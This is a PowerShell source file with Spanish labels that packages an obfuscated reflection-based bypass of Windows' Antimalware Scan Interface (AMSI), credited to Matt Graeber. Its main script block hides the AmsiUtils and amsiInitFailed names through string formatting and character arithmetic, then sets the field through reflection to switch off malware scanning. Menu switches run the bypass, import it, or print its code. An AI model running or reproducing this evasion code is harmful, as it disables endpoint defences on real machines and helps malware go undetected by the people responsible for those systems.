function Invoke-ReflectionObfuscated{
    
    [CmdletBinding()]
    Param(
        [string] $Get,
        [switch] $Run,
        [switch] $Import,
        [switch] $Info,
        [switch] $Code
    )

    $Bypass = New-Object -TypeName PSObject
    $Name = "Reflexion Bypass Ofuscado"
    $Description = "Este bypass es una versión ofuscada del bypass por reflexión de Matt Graebers."
    $Script = {
        $t8S0 =  [tYPE]("{2}{3}{0}{4}{1}"-F 'R','d','thREAD','ING.Th','ea')  ;set-iteM  ('VARIABLe'+':'+'18'+'sI') ([TyPE]("{1}{0}" -f'F','re')) ;  ${O`Zt}=${N`UlL};${te`g`dVHY}="$(('Sy'+'st'+'em').normAlize([ChAr]([bYTe]0x46)+[ChAr](111)+[cHAR](107+7)+[Char]([BYTe]0x6d)+[ChAR](22+46)) -replace [ChAR]([bYTe]0x5c)+[ChAR]([ByTe]0x70)+[chaR]([bytE]0x7b)+[ChAR](77+48-48)+[cHAR]([byTe]0x6e)+[cHAr](52+73)).$([chAr]([BYtE]0x4d)+[chaR](97)+[cHAR](110)+[chAR](97)+[ChaR]([ByTe]0x67)+[cHaR]([bYte]0x65)+[ChAr](109+39-39)+[ChAR]([bytE]0x65)+[cHaR](110)+[CHAr](116*6/6)).$([ChaR](65)+[CHaR]([BytE]0x75)+[cHAR](116+38-38)+[chaR](111)+[chAr](109*101/101)+[ChAr]([BYte]0x61)+[chAR]([BYtE]0x74)+[ChAr](100+5)+[Char](111+49-49)+[Char]([byTe]0x6e)).$(('ÃmsîUt'+'íls').norMalIze([CHAr](70)+[cHAR]([BytE]0x6f)+[Char]([byte]0x72)+[chAR](109*85/85)+[cHaR](14+54)) -replace [CHAR]([byTE]0x5c)+[cHar](112*56/56)+[CHar]([ByTe]0x7b)+[cHAr](19+58)+[CHAr]([bYTe]0x6e)+[Char]([bYTE]0x7d))";${uLuL`UGE`miX}=((("{4}{5}{1}{3}{6}{2}{0}"-f '1)',')','R](119*41/4','+','+[ChAR](109*43/4','3','[cHa')));  (  VAriABLe  T8S0  -VAlUEon )::("{0}{1}" -f 'Slee','p').Invoke(1015);  $18SI."A`ssEmbLY".("{1}{0}"-f'e','GetTyp').Invoke(${t`eGDv`hY}).("{0}{2}{1}"-f 'GetF','ld','ie').Invoke($((("{0}{1}"-f 'ãm','sí')+("{1}{0}"-f'nît','Ì')+("{1}{0}"-f 'âíl','F')+'ed')."norMaL`iZe"([cHaR](2+68)+[CHAR]([byte]0x6f)+[chAR]([bYtE]0x72)+[ChaR]([BYte]0x6d)+[cHar]([byTE]0x44)) -replace [ChaR]([byte]0x5c)+[cHAR](112)+[chAR](8+115)+[chAR](77)+[ChaR](110+87-87)+[Char]([byTe]0x7d)),("{3}{0}{2}{1}" -f'nPublic,','ic','Stat','No')).("{0}{1}{2}"-f'Set','Val','ue').Invoke(${o`Zt},${tr`Ue});
    }

    $Bypass | Add-Member -MemberType NoteProperty -Name "Name" -Value $Name
    $Bypass | Add-Member -MemberType NoteProperty -Name "Description" -Value $Description
    $Bypass | Add-Member -MemberType NoteProperty -Name "Script" -Value $Script
    $Bypass | Add-Member -MemberType ScriptMethod -Name RunScript -Value {& $Bypass.Script}


 
    if($Run){
        Write-Host "Ejecutando $Name..." -ForegroundColor Green
        Start-Sleep 1
        $Bypass.RunScript()
        Write-Host "$Name completado!" -ForegroundColor Green
        return
    }

    if($Import){
        return $Bypass
    }

    if($Get.Length -ne 0)
    {
        if($Get -eq "All"){
            $Bypass.PSObject.Properties | ForEach-Object{

                $name = $_.Name 
                $value = $_.value
                Write-Host "`n${name}: `n$value`n"
                

            }
        }else{
            Write-Output $Bypass | Select-Object -Property $Get
        }
        return
    }


    if($Info){
        Write-Host $Name -ForegroundColor DarkYellow
        Write-Host $("=" * $Host.UI.RawUI.WindowSize.Width) -ForegroundColor Yellow
        Write-Host $Description
        Write-Host $("=" * $Host.UI.RawUI.WindowSize.Width) -ForegroundColor Yellow
    }


    if($Code){
        Write-Host $Script -ForegroundColor Cyan
    }




}
